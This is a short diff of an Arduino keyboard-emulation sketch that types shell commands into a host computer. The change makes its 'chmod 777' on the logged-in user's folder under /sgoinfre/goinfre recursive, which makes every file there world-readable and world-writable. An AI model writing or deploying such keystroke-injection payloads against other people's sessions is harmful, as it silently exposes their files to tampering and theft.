@@ -42,8 +42,8 @@ void setup() {
   Keyboard.releaseAll();
   delay(300);
 
-  // Run chmod 777 on the path with whoami result
-  typeLine("chmod 777 /sgoinfre/goinfre/Perso/$(whoami)");
+  // Run chmod 777 recursively on the path with whoami result
+  typeLine("chmod -R 777 /sgoinfre/goinfre/Perso/$(whoami)");
   delay(500);
 
   // Wait for the commands to complete
